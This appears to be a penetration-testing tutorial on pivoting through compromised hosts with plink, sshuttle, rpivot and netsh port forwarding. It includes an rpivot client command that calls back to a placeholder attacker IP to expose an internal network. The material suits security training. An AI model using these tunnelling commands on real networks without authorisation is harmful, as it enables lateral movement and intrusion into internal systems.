Besides SSH tunneling, several tools allow pivoting and traffic redirection depending on the operating system, available binaries, and network restrictions. These tools are especially useful for living‑off‑the‑land pivoting when installing new software is limited.

---

## Plink (PuTTY Link)

- **Definition**:  
    `plink.exe` is the command‑line SSH client included with PuTTY for Windows. It can create SSH tunnels and SOCKS proxies similarly to OpenSSH.
    
- **Use Case**:  
    Pivoting from Windows hosts where OpenSSH is unavailable but PuTTY is installed.

### Creating a Dynamic SOCKS Tunnel

```bash
plink -ssh -D [socks_port] user@[pivot_host]
```

**Meaning:**

- `socks_port` → Local SOCKS proxy created on the Windows machine
    
- `pivot_host` → SSH-accessible pivot system
    

Applications can then route traffic through `127.0.0.1:[socks_port]`.

### Using Applications Through the SOCKS Proxy

Configure tools (or Proxifier) to use:

```
Proxy: 127.0.0.1
Port:  [socks_port]
Type:  SOCKS
```

After configuration, tools like RDP (`mstsc.exe`) can reach internal systems transparently.

---

## SSH Pivoting with Sshuttle

- **Definition**:  
    `sshuttle` creates a VPN‑like tunnel over SSH by automatically configuring routing and firewall rules.
    
- **Use Case**:  
    Route entire subnets through a pivot host without proxychains.
    

### Installing sshuttle

```bash
sudo apt-get install sshuttle
```

### Routing a Network Through a Pivot

```bash
sudo sshuttle -r user@[pivot_host] [internal_network] -v
```

**Example structure:**

```
sudo sshuttle -r ubuntu@10.10.10.10 172.16.5.0/23 -v
```

This automatically:

- Creates iptables rules
    
- Redirects traffic through SSH
    
- Allows direct tool usage (nmap, RDP, browsers)
    

---

## Rpivot (Reverse SOCKS Proxy)

- **Definition**:  
    `rpivot` is a Python reverse SOCKS proxy that allows an internal host to initiate a connection outward and expose internal network access externally.
    
- **Use Case**:  
    Pivoting when inbound connections to the attacker are blocked.



### Clone Rpivot

```bash
git clone https://github.com/klsecservices/rpivot.git
```

### Install Python 2.7 (required)

```bash
sudo apt-get install python2.7
```

### Start Rpivot Server (Attack Host)

```bash
python2.7 server.py \
--proxy-port [socks_port] \
--server-port [server_port] \
--server-ip 0.0.0.0
```

### Transfer Rpivot to Pivot Host

```bash
scp -r rpivot user@[pivot_host]:~/
```


### Start Rpivot Client (Pivot Host)

```bash
python2.7 client.py \
--server-ip [attacker_ip] \
--server-port [server_port]
```


### Access Internal Services

```bash
proxychains firefox http://[internal_host]
```


---

## Windows Port Forwarding with Netsh

- **Definition**:  
    `netsh` allows native Windows port forwarding without external tools.
    
- **Use Case**:  
    Pivoting through compromised Windows workstations using built‑in utilities.
    


### Create Port Forward Rule

```powershell
netsh interface portproxy add v4tov4 \
listenport=[listen_port] \
listenaddress=[pivot_ip] \
connectport=[target_port] \
connectaddress=[target_ip]
```


### Verify Configuration

```powershell
netsh interface portproxy show v4tov4
```


### Connecting Through the Pivot

```bash
xfreerdp /v:[pivot_ip]:[listen_port] /u:user /p:password
```

Traffic reaching the pivot port is transparently forwarded to the internal target.
